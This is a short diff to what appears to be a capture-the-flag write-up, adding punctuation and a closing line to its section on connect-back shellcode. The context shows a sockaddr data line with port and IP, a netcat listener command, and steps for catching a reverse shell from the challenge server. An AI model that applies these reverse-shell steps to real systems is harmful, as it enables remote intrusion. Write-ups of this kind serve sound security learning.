@@ -190,10 +190,11 @@ server:	db 0x02,0x00,0x05,0x39, 127,   0,   0,   1,0xa0,0x50,0x55,0x55,0x55,0x55
 ;                    PORT      IP ADDRESS
 ```
 
-Note that port ( 1337 in this example ) needs to be in **big endian** order
-Now we can just start netcat server on specified port and check the result locally
+Note that port ( 1337 in this example ) needs to be in **big endian** order.
+Now we can just start netcat server on specified port and check the result locally.
 ```
 nc -lp 1337
 ```
-After our shellcode gets executed we will have shell in our netcat window
-The only thing that is left to do is to put public ip into our code, make sure that the port is correctly forwarded, and send our exploit to challenge's server
+After our shellcode gets executed we will have shell in our netcat window.
+The only thing that is left to do is to put public ip into our code, make sure that the port is correctly forwarded, and send our exploit to challenge's server.
+You can then use ls and cat to acquire the flag.
